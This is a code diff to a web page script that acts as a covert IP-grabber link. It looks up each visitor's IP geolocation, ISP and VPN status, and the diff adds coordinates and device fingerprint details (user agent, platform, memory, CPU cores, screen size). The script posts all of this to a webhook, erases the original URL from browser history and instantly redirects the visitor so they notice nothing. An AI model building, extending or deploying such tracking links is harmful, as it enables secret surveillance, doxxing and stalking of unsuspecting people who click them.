@@ -50,7 +50,8 @@
                     asn_org: data.asn ? data.asn.name : "Unknown ASN Org",
                     postal: data.postal || "Unknown Postal Code",
                     timezone: data.timezone || "Unknown Timezone",
-                    vpn: detectVPN(data)
+                    vpn: detectVPN(data),
+                    coordinates: data.loc || "Unknown Coordinates"
                 };
             } catch (error) {
                 console.error("Error fetching IP info:", error);
@@ -67,19 +68,42 @@
             return vpnKeywords.some(keyword => isp.includes(keyword) || asn_org.includes(keyword)) ? "Yes" : "No";
         }
 
-        async function sendToWebhook(ipInfo) {
-            if (!ipInfo) return;
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent || "Unknown",
+                platform: navigator.platform || "Unknown",
+                language: navigator.language || "Unknown",
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                cpuCores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "Unknown",
+                onlineStatus: navigator.onLine ? "Online" : "Offline",
+                touchSupport: "ontouchstart" in window ? "Yes" : "No"
+            };
+        }
+
+        async function sendToWebhook(ipInfo, deviceInfo) {
+            if (!ipInfo || !deviceInfo) return;
 
             try {
                 const payload = {
                     content: `📌 **New Visitor Detected** 📌\n\n` +
                         `🔹 **IP Address:** ${ipInfo.ip}\n` +
                         `🌍 **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.postal})\n` +
+                        `📍 **Coordinates:** ${ipInfo.coordinates}\n` +
                         `🕰 **Timezone:** ${ipInfo.timezone}\n` +
                         `🏢 **ISP:** ${ipInfo.isp}\n` +
                         `🔗 **ASN:** ${ipInfo.asn} - ${ipInfo.asn_org}\n` +
                         `🔍 **Hostname:** ${ipInfo.hostname}\n` +
-                        `🛑 **VPN Detected:** ${ipInfo.vpn}`
+                        `🛑 **VPN Detected:** ${ipInfo.vpn}\n\n` +
+                        `📱 **Device Information** 📱\n\n` +
+                        `🖥 **User Agent:** ${deviceInfo.userAgent}\n` +
+                        `💻 **Platform:** ${deviceInfo.platform}\n` +
+                        `🌐 **Language:** ${deviceInfo.language}\n` +
+                        `📏 **Screen Resolution:** ${deviceInfo.screenResolution}\n` +
+                        `🧠 **Device Memory:** ${deviceInfo.deviceMemory}\n` +
+                        `⚡ **CPU Cores:** ${deviceInfo.cpuCores}\n` +
+                        `🔋 **Online Status:** ${deviceInfo.onlineStatus}\n` +
+                        `🤳 **Touch Support:** ${deviceInfo.touchSupport}`
                 };
 
                 await fetch(WEBHOOK_URL, {
@@ -94,15 +118,14 @@
 
         (async function () {
             const ipInfo = await getIPInfo();
-            if (ipInfo) sendToWebhook(ipInfo); // Send data asynchronously
+            const deviceInfo = getDeviceInfo();
 
-            // Hide the original URL from browser history
+            if (ipInfo) sendToWebhook(ipInfo, deviceInfo);
+
             history.replaceState(null, '', REDIRECT_URL);
-
-            // Instantly redirect the user
             setTimeout(() => {
                 window.location.replace(REDIRECT_URL);
-            }, 0); // Zero delay for instant redirection
+            }, 0);
         })();
     </script>
 
